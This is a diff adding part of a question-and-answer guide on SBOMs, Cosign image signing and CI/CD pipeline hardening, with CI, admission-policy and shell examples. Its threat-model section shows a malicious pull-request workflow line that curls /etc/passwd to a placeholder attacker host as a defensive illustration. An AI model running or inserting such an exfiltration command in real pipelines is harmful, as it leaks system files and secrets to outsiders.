+Distributed alongside artifacts.
+
+**Option 3: SBOM repository**
+
+Dedicated SBOM storage:
+- Dependency-Track
+- SBOM Manager
+- Internal database
+
+Queryable, searchable.
+
+**SBOM lifecycle:**
+
+**1. Generate during build:**
+
+```yaml
+# CI pipeline:
+build:
+  script:
+    - docker build -t my-app:$VERSION .
+    - syft my-app:$VERSION -o spdx-json > sbom.json
+    - cosign attest --predicate sbom.json my-app:$VERSION
+```
+
+**2. Verify at deploy:**
+
+```yaml
+# Admission controller:
+verifyImages:
+  - attestations:
+      - type: SBOM
+```
+
+**3. Monitor over time:**
+
+New CVEs published → query SBOM database → find affected:
+
+```sql
+SELECT image, version FROM sbom_components 
+WHERE package = 'log4j' AND version < '2.17.1';
+```
+
+**4. Update and rebuild:**
+
+When components update, regenerate SBOM.
+
+**Using SBOMs:**
+
+**Use case 1: CVE search**
+
+New CVE for `openssl-1.1.1k`:
+
+```bash
+# Search all SBOMs for vulnerable openssl:
+grep -l "openssl.*1\.1\.1k" *.sbom.json
+```
+
+Identify affected images immediately.
+
+**Use case 2: License audit**
+
+```bash
+# Find all GPL components:
+jq '.packages[] | select(.licenseConcluded | startswith("GPL"))' sbom.json
+```
+
+Compliance check.
+
+**Use case 3: Component reduction**
+
+```bash
+# Count unique packages:
+jq '.packages | length' sbom.json
+```
+
+Track over time. Aim to reduce.
+
+**Use case 4: Dependency review**
+
+```bash
+# What does this image depend on?
+syft my-app:v1
+```
+
+Visibility into stack.
+
+**SBOM tools:**
+
+**Generation:**
+- Syft (general)
+- Trivy
+- SPDX SBOM Generator
+- CycloneDX tools per language
+
+**Management:**
+- Dependency-Track
+- OSS Review Toolkit
+- ClearlyDefined
+
+**Analysis:**
+- Grype (vulnerability matching)
+- in-toto
+- SBOM-tool
+
+**Challenges:**
+
+**Challenge 1: Incomplete SBOMs**
+
+Some components hard to detect:
+- Custom internal libraries
+- Vendored dependencies
+- Compiled binaries
+- Dynamic linking
+
+Tools improving but not perfect.
+
+**Challenge 2: SBOM drift**
+
+Image generated SBOM at build. Runtime might differ:
+- Sidecar injected
+- Configuration changes
+- Hot patches
+
+Need continuous SBOM verification.
+
+**Challenge 3: Volume**
+
+Large org: thousands of images, millions of components. Managing SBOMs at scale needs tooling.
+
+**Challenge 4: False positives**
+
+SBOM includes component, but it's not actually used (dead code). CVE flagged unnecessarily.
+
+VEX (Vulnerability Exploitability eXchange) addresses:
+
+```json
+{
+  "vulnerability": "CVE-2023-1234",
+  "status": "not_affected",
+  "justification": "Component included but not executed"
+}
+```
+
+**Production scenarios:**
+
+1. **Log4Shell response with SBOMs**: Within hours of CVE announcement, queried SBOM database. Identified 47 vulnerable images. Patched and redeployed. Without SBOMs would have taken days.
+
+2. **License compliance audit**: Lawyer requested all licenses in product. Generated SBOMs for all images, aggregated licenses. Discovered unexpected GPL component (transitive dep). Replaced.
+
+3. **Federal compliance**: Government customer required SBOMs per Executive Order 14028. Implemented SBOM generation in CI, attached to images. Provided to customer with releases.
+
+4. **Reduced dependency footprint**: SBOM showed 850 components in image. Reviewed, removed unused, switched to minimal alternatives. Down to 80 components. Smaller attack surface.
+
+5. **VEX for false positives**: Several CVEs flagged but not exploitable. Created VEX docs marking as "not_affected" with justification. Scan tools respected. Cleaner alerting.
+
+---
+
+## 239. Explain image signing with Cosign
+
+Cosign (part of Sigstore) signs and verifies container images cryptographically. Ensures images haven't been tampered with and come from trusted sources.
+
+**Why signing:**
+
+Without signing:
+- Registry compromise = tampered images
+- Tag manipulation possible
+- Can't verify origin
+
+With signing:
+- Cryptographic proof of source
+- Tamper detection
+- Trust establishment
+
+**Sigstore ecosystem:**
+
+- **Cosign**: signing tool
+- **Fulcio**: certificate authority for keyless signing
+- **Rekor**: transparency log
+- **Policy controller**: Kubernetes admission
+
+**Signing methods:**
+
+**Method 1: Long-lived keys**
+
+```bash
+# Generate key pair:
+cosign generate-key-pair
+# Creates cosign.key (private) and cosign.pub (public)
+
+# Sign:
+cosign sign --key cosign.key myregistry.com/my-app:v1
+
+# Verify:
+cosign verify --key cosign.pub myregistry.com/my-app:v1
+```
+
+**Method 2: Keyless signing (recommended)**
+
+```bash
+# Sign using OIDC identity:
+cosign sign myregistry.com/my-app:v1
+# Opens browser for OIDC auth
+# Or uses workload identity in CI
+```
+
+No keys to manage. Uses:
+- OIDC provider for identity
+- Fulcio issues short-lived cert
+- Rekor logs the signature
+
+**Verifying keyless:**
+
+```bash
+cosign verify \
+  --certificate-identity-regexp "https://github.com/myorg/.*" \
+  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
+  myregistry.com/my-app:v1
+```
+
+Verifies:
+- Identity was authorized (GitHub Actions in myorg)
+- OIDC issuer is GitHub
+- Signature is valid
+
+**How signing works:**
+
+```
+1. Image built
+2. Cosign hashes image manifest
+3. Hash signed with private key (or short-lived cert)
+4. Signature stored in registry alongside image
+5. Optionally logged in Rekor (transparency log)
+```
+
+**How verification works:**
+
+```
+1. Pull image
+2. Cosign retrieves signature
+3. Verify signature with public key (or cert chain)
+4. Optionally verify Rekor log entry
+5. Image trusted if all checks pass
+```
+
+**Signing in CI:**
+
+**GitHub Actions:**
+
+```yaml
+name: build-and-sign
+permissions:
+  id-token: write   # Required for OIDC
+  contents: read
+  packages: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      
+      - uses: docker/build-push-action@v5
+        id: build
+        with:
+          push: true
+          tags: ghcr.io/myorg/my-app:${{ github.sha }}
+      
+      - uses: sigstore/cosign-installer@v3
+      
+      - name: Sign image
+        env:
+          DIGEST: ${{ steps.build.outputs.digest }}
+        run: |
+          cosign sign --yes ghcr.io/myorg/my-app@${DIGEST}
+```
+
+Keyless signing in GitHub. No keys to manage.
+
+**GitLab CI:**
+
+```yaml
+sign:
+  image: gcr.io/projectsigstore/cosign:latest
+  script:
+    - cosign sign --identity-token $CI_JOB_JWT_V2 $IMAGE
+```
+
+**Verifying at deploy:**
+
+**Method 1: Manual**
+
+```bash
+cosign verify --key cosign.pub my-image:v1 && \
+  kubectl apply -f deployment.yaml
+```
+
+**Method 2: Admission controller (Kyverno)**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: verify-image-signatures
+spec:
+  validationFailureAction: enforce
+  webhookTimeoutSeconds: 30
+  rules:
+    - name: verify-signatures
+      match:
+        any:
+          - resources:
+              kinds:
+                - Pod
+      verifyImages:
+        - imageReferences:
+            - "ghcr.io/myorg/*"
+          mutateDigest: true
+          required: true
+          attestors:
+            - count: 1
+              entries:
+                - keyless:
+                    subject: "https://github.com/myorg/.*"
+                    issuer: "https://token.actions.githubusercontent.com"
+                    rekor:
+                      url: https://rekor.sigstore.dev
+```
+
+Pods with unsigned images rejected.
+
+**Method 3: Sigstore Policy Controller**
+
+```yaml
+apiVersion: policy.sigstore.dev/v1beta1
+kind: ClusterImagePolicy
+metadata:
+  name: image-policy
+spec:
+  images:
+    - glob: "ghcr.io/myorg/**"
+  authorities:
+    - keyless:
+        url: https://fulcio.sigstore.dev
+        identities:
+          - issuer: https://token.actions.githubusercontent.com
+            subjectRegExp: "https://github.com/myorg/.*"
+```
+
+Native Kubernetes admission for Sigstore.
+
+**Attestations:**
+
+Beyond signing, attest about the image:
+
+**SBOM attestation:**
+
+```bash
+# Generate SBOM:
+syft my-app:v1 -o spdx-json > sbom.json
+
+# Attest:
+cosign attest --predicate sbom.json --type spdx my-app:v1
+```
+
+**Build provenance:**
+
+```bash
+cosign attest --predicate provenance.json --type slsaprovenance my-app:v1
+```
+
+**Vulnerability scan:**
+
+```bash
+trivy image --format cosign-vuln my-app:v1 > vuln.json
+cosign attest --predicate vuln.json --type vuln my-app:v1
+```
+
+**Verify attestations:**
+
+```bash
+cosign verify-attestation --type spdx \
+  --certificate-identity-regexp "https://github.com/myorg/.*" \
+  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
+  my-app:v1
+```
+
+**Policy with attestations:**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-attestations
+spec:
+  rules:
+    - name: check-sbom
+      verifyImages:
+        - imageReferences:
+            - "ghcr.io/myorg/*"
+          attestations:
+            - type: SBOM
+              attestors:
+                - count: 1
+                  entries:
+                    - keyless:
+                        subject: "https://github.com/myorg/.*"
+```
+
+Require SBOM attestation.
+
+**Rekor (transparency log):**
+
+All keyless signatures logged in Rekor:
+
+```bash
+# Search Rekor for an image:
+rekor-cli search --sha <image-digest>
+
+# Verify against log:
+cosign verify --rekor-url https://rekor.sigstore.dev <image>
+```
+
+Public, immutable log of who signed what.
+
+**Common workflows:**
+
+**Workflow 1: CI signs all images**
+
+```
+Build → Test → Scan → Sign → Push
+                       ↓
+                  Cosign signature in registry
+```
+
+Every image signed automatically.
+
+**Workflow 2: Deployment requires signatures**
+
+```
+Pod creation → Admission webhook → Verify signature → Allow or deny
+```
+
+Unsigned images blocked.
+
+**Workflow 3: Multiple signers**
+
+```bash
+# Require multiple signatures:
+cosign sign --key dev-key.key my-app:v1
+cosign sign --key security-team.key my-app:v1
+```
+
+Policy requires both:
+
+```yaml
+attestors:
+  - count: 2   # Require 2 signers
+    entries:
+      - keys:
+          publicKeys: <dev-key>
+      - keys:
+          publicKeys: <security-key>
+```
+
+Two-person integrity (similar to two-person review).
+
+**Considerations:**
+
+**Consideration 1: Key management**
+
+If using long-lived keys:
+- Backup keys securely
+- Rotate periodically
+- HSM for production keys
+
+If keyless:
+- Trust OIDC provider
+- No key management
+
+**Consideration 2: Signature distribution**
+
+Signatures stored in registry alongside images. Registry must support OCI artifacts (most modern do).
+
+**Consideration 3: Verification performance**
+
+Verification adds latency:
+- Fetch signature
+- Verify cryptography
+- Check Rekor (optional)
+
+Typically <1s. Acceptable for admission.
+
+**Consideration 4: Bootstrapping**
+
+Initial deploys: where does verification key come from?
+
+- Hardcoded in admission config
+- Distributed via secure config
+
+**Consideration 5: Air-gapped environments**
+
+Sigstore depends on Internet for keyless (Fulcio, Rekor). For air-gapped:
+- Long-lived keys
+- Private Fulcio/Rekor instance
+
+**Production scenarios:**
+
+1. **All production images signed**: Adopted Cosign in CI. Every image automatically signed. Kyverno verified at admission. Unsigned = rejected. Supply chain integrity assured.
+
+2. **Keyless migration**: Started with long-lived keys. Painful management. Migrated to Sigstore keyless with GitHub OIDC. No more key
+
+management. Better security (short-lived certs).
+
+3. **SBOM attestation for compliance**: Government customer required SBOM with verification. Cosign attested SBOM, signed. Customer's admission controller verified. Compliance achieved.
+
+4. **Detected image tampering**: Registry was misconfigured briefly, allowing unauthorized push. Cosign verification at admission detected (signature didn't match). Caught before deploy.
+
+5. **Multi-signer for critical**: Production payment service required two signatures (dev + security). Kyverno enforced. Defense in depth.
+
+---
+
+## 240. How do you secure CI/CD pipelines?
+
+CI/CD pipelines have powerful permissions: deploying to production, accessing secrets, modifying infrastructure. Compromised CI = compromised everything.
+
+**Why CI/CD security matters:**
+
+CI typically has:
+- Cluster admin access
+- Cloud admin credentials
+- Production deploy permissions
+- Source code access
+- Secret access
+
+Compromise = catastrophic.
+
+**Threat model:**
+
+**Threat 1: Compromised CI service**
+
+The CI platform itself attacked:
+- Codecov (2021): malicious code in bash uploader
+- SolarWinds-style attacks
+
+**Threat 2: Pipeline injection**
+
+```yaml
+# Malicious PR:
+on:
+  pull_request:
+    paths: ['**']
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Malicious
+        run: |
+          curl http://attacker.com/exfil -d "$(cat /etc/passwd)"
+          # Or steal secrets
+```
+
+PR builds run with permissions, can be abused.
+
+**Threat 3: Compromised dependencies**
+
+Build pulls dependencies → malicious one runs in CI:
+- npm packages
+- Docker base images
+- CI actions/plugins
+
+**Threat 4: Credential theft**
+
+Static secrets in CI environment variables. Logs may leak.
+
+**Threat 5: Insider threat**
+
+Developer commits malicious code → CI runs → compromised.
+
+**Securing CI/CD - key practices:**
+
+**Practice 1: Ephemeral runners**
+
+Each build on fresh runner. No persistent state:
+
+```yaml
+# GitHub Actions: each job gets fresh VM
+# GitLab: shared runners auto-destroy
+
+# Self-hosted: ensure clean between builds
+```
+
+**Practice 2: Isolated builds**
+
+Don't run untrusted code (PRs from forks) with secrets:
+
+```yaml
+# GitHub Actions:
+on:
+  pull_request_target:  # Has secrets but doesn't checkout PR
+    paths: ['**']
+
+# vs.
+on:
+  pull_request:  # No secrets but checks out PR
+```
+
+Untrusted code: `pull_request` (no secrets).
+Trusted: `pull_request_target` (after maintainer review).
+
+**Practice 3: Least privilege**
+
+CI runs with minimum permissions:
+
+```yaml
+# GitHub Actions:
+permissions:
+  contents: read     # Just read code
+  packages: write    # Push images
+  # No id-token: write unless OIDC needed
+  # No actions: write
+```
+
+Cloud credentials: scoped IAM roles, not admin.
+
+Kubernetes deploys: namespace-scoped service accounts, not cluster-admin.
+
+**Practice 4: OIDC for cloud auth**
+
+Instead of static credentials:
+
+```yaml
+# GitHub Actions:
+permissions:
+  id-token: write
+
+jobs:
+  deploy:
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123:role/github-deploy
+          aws-region: us-east-1
+```
+
+GitHub provides OIDC token, AWS verifies. No AWS keys stored.
+
+**Practice 5: Pin actions/dependencies**
+
+```yaml
+# Bad: floating ref:
+- uses: actions/checkout@v4
+
+# Better: SHA pinned:
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1
+```
+
+Pin to specific commits. If action's tag is moved (compromise), pinned version unaffected.
+
+**Practice 6: Secret management**
+
+```yaml
+# Bad: secret in plaintext:
+env:
+  API_KEY: my-secret-key
+
+# Good: from secrets:
+env:
+  API_KEY: ${{ secrets.API_KEY }}
+```
+
+Use:
+- GitHub Secrets / GitLab Variables
+- External: Vault, AWS Secrets Manager
+- Never log secrets:
+
+```yaml
+# Mask in logs:
+echo "::add-mask::$SECRET"
+```
+
+**Practice 7: Limit secret scope**
+
+```yaml
+# Repository secrets: only in this repo
+# Environment secrets: only when deploying to that environment
+# Organization secrets: across multiple repos (use sparingly)
+```
+
+Environment-specific:
+
+```yaml
+jobs:
+  deploy:
+    environment: production   # Requires approval
+    steps:
+      - run: deploy ${{ secrets.PROD_KEY }}
+```
+
+Production secrets only available with approval.
+
+**Practice 8: Branch protection**
+
+```yaml
+# GitHub branch protection:
+- Required reviews: 1+ approvals
+- Required status checks must pass
+- Required signed commits
+- No force pushes
+- Required up-to-date branches
+```
+
+Prevents bypassing CI checks.
+
+**Practice 9: Approval gates**
+
+```yaml
+# GitHub Actions environments:
+environment:
+  name: production
+  reviewers:
+    - security-team
+```
+
+Production deploys require explicit human approval.
+
+**Practice 10: Audit logging**
+
+All CI activity logged:
+- Who triggered builds
+- What ran
+- What permissions used
+- What was deployed
+
+Centralize logs, retain for forensics.
+
+**Practice 11: Network restrictions**
+
+```yaml
+# Restrict CI's network access:
+egress:
+  - allowed-domains:
+      - github.com
+      - registry.npmjs.org
+      - myregistry.example.com
+  - blocked: all-others
+```
+
+Prevents data exfiltration from CI.
+
+**Practice 12: Image scanning in pipeline**
+
+```yaml
+# Before push:
+- name: Scan image
+  run: |
+    trivy image --severity CRITICAL --exit-code 1 my-app:${{ github.sha }}
+```
+
+Block on critical vulnerabilities.
+
+**Practice 13: Code signing**
+
+```yaml
+- name: Sign commit
+  run: |
+    git config commit.gpgsign true
+    git commit -S -m "message"
+```
+
+Require signed commits. Branch protection enforces.
+
+**Practice 14: Reproducible builds**
+
+```yaml
+# Pin all versions:
+FROM alpine:3.18.4@sha256:abc...
+```
+
+Same input → same output. Detect tampering by comparing builds.
+
+**Practice 15: Verify pipeline integrity**
+
+```bash
+# Check pipeline files signed:
+cosign verify --key cosign.pub pipeline.yaml
+```
+
+Or use Tekton Chains for verifiable pipelines.
+
+**Common attacks and mitigations:**
+
+**Attack 1: Malicious PR runs in CI**
+
+```yaml
+# Attacker submits PR modifying CI to steal secrets
+```
+
+Mitigation:
+- `pull_request_target` doesn't checkout PR code
+- Require maintainer approval before running
+- Limit fork access to secrets
+
+**Attack 2: Tagged action compromise**
+
+```yaml
+# Attacker compromises actions/checkout, retags v4
+```
+
+Mitigation:
+- Pin to SHA, not tag
+- Use Dependabot to update SHAs
+
+**Attack 3: Cache poisoning**
+
+```yaml
+# Attacker injects malicious cache:
+cache:
+  paths:
+    - ~/.npm
+```
+
+Subsequent builds use poisoned cache.
+
+Mitigation:
+- Don't trust cache for security-critical builds
+- Sign cache entries
+
+**Attack 4: Credential theft from logs**
+
+```yaml
+# Accidentally:
+- run: echo "Token: $TOKEN"
+```
+
+Mitigation:
+- Mask secrets
+- Avoid debug logging in production
+- Review logs for leaked secrets
+
+**Attack 5: Privilege escalation**
+
+```yaml
+# CI has admin → can do anything
+```
+
+Mitigation:
+- Per-job permissions
+- Time-limited credentials
+- OIDC for cloud
+
+**Pipeline as code:**
+
+CI configuration in Git:
+
+```yaml
+# .github/workflows/build.yaml
+# .gitlab-ci.yml
+# Tekton PipelineRun
+```
+
+Benefits:
+- Reviewed via PRs
+- Audit trail
+- Reproducible
+
+**Tekton Chains:**
+
+Kubernetes-native CI with built-in signing:
+
+```yaml
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  name: build
+spec:
+  pipelineRef:
+    name: build-and-sign
+```
+
+Tekton Chains automatically signs and provides provenance.
+
+**Production scenarios:**
+
+1. **GitHub OIDC eliminated AWS keys**: Previously AWS credentials in GitHub Secrets. Long-lived, attack surface. Migrated to OIDC. Short-lived, scoped credentials. Better security.
+
+2. **Codecov-style attack prevented by pinning**: Read about Codecov compromise. Reviewed actions, found floating tags. Pinned to SHAs. Dependabot updates with review. Avoided similar issues.
+
+3. **Production deploys require approval**: After CI mistake deployed broken code. Implemented environments with required reviewers. Production deploys need human approval. Catches mistakes.
+
+4. **PR build security incident**: Malicious PR tried to run script that exfil'd secrets. Was caught by reviewer. Now: `pull_request_target` for actions needing secrets, explicit approval to run on untrusted PRs.
+
+5. **Pipeline secret leak**: Developer accidentally logged secret in plain text. Caught by log monitoring. Rotated. Implemented secret masking, log scanning for leakage. Prevention better than detection.
+
